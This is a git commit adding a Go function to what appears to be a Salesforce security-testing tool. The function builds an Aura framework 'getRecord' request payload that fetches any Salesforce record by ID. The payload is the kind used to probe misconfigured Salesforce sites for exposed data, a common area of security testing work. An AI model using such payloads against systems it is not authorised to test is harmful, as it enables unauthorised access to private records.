1f16a4c84a685174fca08ddcedd5f9a61314d2c5
Ph33r <77519024+Ph33rr@users.noreply.github.com>
2022-07-09 01:37:59 +0300

    add PayloadGeneratorGetRecord Func

--- pkg/salesforce/payload.go
+++ pkg/salesforce/payload.go
@@ -26,3 +26,24 @@ func PayloadGeneratorGetItems(objectName string, page_size int, page int) []byte
 	}
 	return genPOC
 }
+
+
+func PayloadGeneratorGetRecord(recodeId string) []byte {
+
+	payload1 := `[{"id":"CirrusGo","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"`
+	payload2 := recodeId
+	payload3 := `","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}]`
+	finalpayload := []byte(payload1 + payload2 + payload3)
+
+	p := payload{
+		Massage: json.RawMessage(finalpayload),
+	}
+
+	genPOC, err := json.Marshal(p)
+
+	if err != nil {
+		panic(err)
+	}
+	return genPOC
+
+}
